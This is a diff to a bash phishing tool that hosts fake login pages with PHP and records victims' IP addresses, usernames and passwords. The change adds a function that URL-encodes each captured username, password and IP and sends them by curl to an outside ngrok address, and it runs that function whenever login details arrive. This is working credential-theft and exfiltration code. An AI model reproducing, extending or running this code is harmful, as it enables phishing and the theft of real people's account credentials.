@@ -409,10 +409,14 @@ setup_site() {
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
+global_ip=""
+global_username=""
+global_password=""
 ## Get IP address
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
+	global_ip=$IP
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
@@ -423,11 +427,21 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
+	global_username=$ACCOUNT
+	global_password=$PASSWORD
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+}
+
+send_data_goldfish(){
+	url="https://5fe4-2405-201-f029-282e-7724-f847-19ef-741d.ngrok-free.app"
+	url_encoded_global_username=$(urlencode "$global_username")
+	url_encoded_global_password=$(urlencode "$global_password")
+	url_encoded_global_ip=$(urlencode "$global_ip")
+	response=$(curl "$url?username=$url_encoded_global_username&password=$url_encoded_global_password&ip_addr=$url_encoded_global_ip")
 }
 
 ## Print data
@@ -443,6 +457,7 @@ capture_data() {
 		if [[ -e ".server/www/usernames.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
+			send_data_goldfish
 			rm -rf .server/www/usernames.txt
 		fi
 		sleep 0.75
